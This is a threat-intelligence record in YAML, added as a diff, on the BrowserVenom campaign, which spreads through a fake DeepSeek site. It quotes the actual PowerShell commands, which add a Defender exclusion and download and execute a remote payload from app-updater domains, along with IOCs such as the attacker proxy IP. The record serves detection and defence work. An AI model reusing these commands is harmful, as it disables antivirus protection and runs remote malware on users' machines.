@@ -1,0 +1,54 @@
+description: A phishing campaign using a fake DeepSeek website to deliver AI_Launcher_1.21.exe,
+  which installs BrowserVenom that configures browsers to proxy traffic through 141.105.130.106.
+attribution: Russian-speaking threat actors
+malware_families:
+- BrowserVenom
+TTPs:
+  processes: []
+  commandline:
+  - powershell.exe -inputformat none -outputformat none -NonInteractive -ExecutionPolicy
+    Bypass -Command Add-MpPreference -ExclusionPath $USERPROFILE
+  - powershell.exe -inputformat none -outputformat none -NonInteractive -ExecutionPolicy
+    Bypass -Command $ap = "/api/getFile?fn=lai.exe";$b = $null;foreach($i in 0..1000000){$s
+    = if ($i -gt 0) {$i} else {" "};$d = "https://app-updater$s.app$ap";$b = (New-Object
+    Net.WebClient).DownloadData($d);if ($b){break}};if ([Runtime.InteropServices.RuntimeEnvironment]::GetSystemVersion()
+    -match "^v2"){[IO.File]::WriteAllBytes("$env:USERPROFILE\\Music\\1.exe",$b);Start-Process
+    "$env:USERPROFILE\\Music\\1.exe" -NoNewWindow}else{([Reflection.Assembly]::Load($b)).EntryPoint.Invoke($null,$null)}
+  powershell:
+  - Add-MpPreference -ExclusionPath $USERPROFILE
+  - $ap = "/api/getFile?fn=lai.exe";$b = $null;foreach($i in 0..1000000){$s = if ($i
+    -gt 0) {$i} else {" "};$d = "https://app-updater$s.app$ap";$b = (New-Object Net.WebClient).DownloadData($d);if
+    ($b){break}};if ([Runtime.InteropServices.RuntimeEnvironment]::GetSystemVersion()
+    -match "^v2"){[IO.File]::WriteAllBytes("$env:USERPROFILE\\Music\\1.exe",$b);Start-Process
+    "$env:USERPROFILE\\Music\\1.exe" -NoNewWindow}else{([Reflection.Assembly]::Load($b)).EntryPoint.Invoke($null,$null)}
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: ''
+    destination_address: 141.105.130.106
+    port: '37121'
+  file_activity:
+  - '%USERPROFILE%\\Music\\1.exe'
+  persistence:
+  - Exclusion of $USERPROFILE from Windows Defender
+  - Installation of a hardcoded root certificate to LocalMachine\Root store
+  - Modification of browser shortcuts and profiles to set proxy server "--proxy-server=\"141.105.130.106:37121\""
+  process_relations: []
+IOCs:
+  hashes:
+  - d435a9a303a27c98d4e7afa157ab47de
+  - dc08e0a005d64cc9e5b2fdd201f97fd6
+  ips:
+  - 141.105.130.106
+  domains:
+  - deepseek-platform.com
+  - r1deepseek-ai.com
+  - app-updater1.app
+  - app-updater2.app
+  - app-updater.app
+authors:
+- Lisandro Ubiedo
+reference: https://securelist.com/browservenom-mimicks-deepseek-to-use-malicious-proxy/115728
+date_of_publication: June 11, 2025
+file_creation_date: October 01, 2025
